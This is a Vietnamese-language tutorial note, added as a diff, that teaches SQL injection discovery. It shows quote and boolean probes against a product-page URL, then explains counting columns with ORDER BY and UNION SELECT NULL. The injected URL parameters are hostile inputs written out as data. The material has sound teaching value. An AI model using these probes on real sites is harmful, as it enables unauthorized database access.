@@ -1,0 +1,45 @@
+Test 1: https://shop.com/product.php?id=8'
+→ Error: You have an error in your SQL syntax near ''' 
+
+Test 2: https://shop.com/product.php?id=8 AND 1=1
+→ Hiển thị sản phẩm bình thường
+
+Test 3: https://shop.com/product.php?id=8 AND 1=2
+→ Không hiển thị gì (blank page)
+✅ Kết luận: Có SQL Injection
+
+🧱 PHƯƠNG PHÁP 1: ORDER BY (Phương pháp đếm bằng sắp xếp)
+Ý tưởng gốc
+ORDER BY n = yêu cầu database sắp xếp theo cột thứ n
+Nếu cột thứ n không tồn tại, database sẽ báo lỗi.
+
+Bạn thử tăng dần:
+
+ORDER BY 1   → OK
+ORDER BY 2   → OK
+ORDER BY 3   → lỗi
+→ nghĩa là chỉ có 2 cột
+
+🧱 PHƯƠNG PHÁP 2: UNION SELECT NULL,... (Phương pháp ghép dòng)
+UNION = nối thêm hàng (row) từ một câu SELECT khác vào bên dưới kết quả.
+Ví dụ:
+SELECT id, name, score FROM Students
+UNION
+SELECT 999, 'Test', 0;
+Kết quả sẽ là:
+id	name	score
+1	An	9.0
+2	Bình	8.5
+3	Chi	7.0
+999	Test	0
+
+Quan trọng: UNION chỉ hoạt động nếu hai SELECT có cùng số cột.
+Giờ tưởng tượng: Bạn không biết câu SELECT gốc trả về bao nhiêu cột. Nhưng bạn muốn viết một câu UNION khớp số cột với nó.
+Vì bạn chưa biết kiểu dữ liệu từng cột (số, chữ, ngày tháng,…), nên: dùng giá trị cụ thể (ví dụ 123, 'ABC') sẽ rất dễ sai kiểu.
+Còn NULL thì: là “trống” → database thấy ổn trong hầu hết kiểu cột.
+
+👉 Đó là lý do dùng:
+UNION SELECT NULL
+UNION SELECT NULL, NULL
+UNION SELECT NULL, NULL, NULL
+...
